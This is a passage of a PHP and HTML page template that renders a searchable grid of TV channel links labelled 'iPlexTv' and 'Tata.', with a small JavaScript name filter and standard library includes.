height:var(--header-height);">
    </div>
    <center>
        <div class="main" id="ch_list" style="margin-top: 14px;"></div>



        <?php foreach ($channelsData as $channel): ?>
       
       <a href="play.php?id=<?php echo $channel['id']; ?>" class="popup-video">
         <div id="TataSky_Catchup" class="tvv-item">
         <div class="tvv-name-s">iPlexTv</div>
         <div class="tvv-name-t"><?php echo $channel['group']; ?></div>
         <img src="https://img.freepik.com/premium-vector/world-television-logo-template-design-vector-emblem-design-concept-creative-symbol-icon_316488-2269.jpg" alt="img" class="loading" loading="lazy" >
         <div class="tvv-name2">Tata.</div>
         <div class="tvv-name"><?php echo $channel['name']; ?></div>
         </div>
       </a>

    


       <?php endforeach; ?>
       
       <a href=""><div class="fire_row_load" id="fire_row_load"><button id="load_more_anbtn" data-page
                style="padding-left: 25px; padding-right: 25px; padding-top: 10px;font-weight:1000; padding-bottom: 10px;width:50%"
                class="btn-11 custom-btn"> Made By @sanjiblive</button></div></a> 
        <br><br><br>
    </center>



    <script>
    document.addEventListener('DOMContentLoaded', function () {
        // Get the input element for searching
        const searchInput = document.getElementById('look_tv_here');
        const tvvItemContainers = document.querySelectorAll('.tvv-item'); // Get all TVV item containers

        // Store the initial display property of TVV item containers
        const initialDisplayProperties = [];
        tvvItemContainers.forEach(function (container) {
            initialDisplayProperties.push(window.getComputedStyle(container).display);
        });

        // Add an event listener for the input element
        searchInput.addEventListener('input', function () {
            const searchTerm = searchInput.value.trim().toLowerCase();

            // Loop through each TVV item container and check if it contains the search term
            tvvItemContainers.forEach(function (container, index) {
                const tvvNameElement = container.querySelector('.tvv-name');
                const tvvName = tvvNameElement.textContent.trim().toLowerCase();

                if (tvvName.includes(searchTerm)) {
                    container.style.display = initialDisplayProperties[index]; // Restore the initial display property
                } else {
                    container.style.display = 'none'; // Hide non-matching containers
                }
            });
        });
    });
</script>



    <div class="stwRainbow"></div>
    <div class="stwBlurRainbow"></div>
    <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="../cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
    <script src="../cdn.jsdelivr.net/npm/bootstrap%405.2.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
        crossorigin="anonymous"></script>



</body>


</html>
